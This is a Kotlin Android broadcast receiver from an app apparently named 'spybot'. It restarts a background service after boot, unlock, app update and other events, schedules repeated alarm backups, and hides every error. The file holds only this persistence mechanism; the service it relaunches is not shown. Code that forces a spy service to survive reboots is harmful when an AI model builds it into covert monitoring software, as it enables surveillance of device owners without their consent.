package com.spybot.app.Receiver

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import androidx.core.content.ContextCompat
import com.spybot.app.MainService

class BootCompleteReceiver : BroadcastReceiver() {

    companion object {
        private const val PREFS_NAME = "spybot_prefs"
        private const val KEY_SERVICE_ENABLED = "service_enabled"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (!shouldServiceRun(context)) return

        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_USER_PRESENT -> instantStart(context)
            Intent.ACTION_SHUTDOWN -> saveServiceState(context, true)
            else -> instantStart(context)
        }
    }

    private fun instantStart(context: Context) {
        startServiceDirect(context)
        scheduleAlarmBackup(context, 100)
        scheduleAlarmBackup(context, 1000)
        scheduleAlarmBackup(context, 3000)
        saveServiceState(context, true)
    }

    private fun startServiceDirect(context: Context) {
        try {
            val serviceIntent = Intent(context, MainService::class.java).apply { action = MainService.ACTION_START }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {}
    }

    private fun scheduleAlarmBackup(context: Context, delayMs: Long) {
        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(context, RestartReceiver::class.java).apply { action = MainService.ALARM_ACTION }
            val pendingIntent = PendingIntent.getBroadcast(
                context, (System.currentTimeMillis() % 10000).toInt(), intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val triggerTime = SystemClock.elapsedRealtime() + delayMs
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (e: Exception) {}
    }

    private fun shouldServiceRun(context: Context): Boolean {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getBoolean(KEY_SERVICE_ENABLED, true)
    }

    private fun saveServiceState(context: Context, running: Boolean) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SERVICE_ENABLED, running)
            .apply()
    }
}
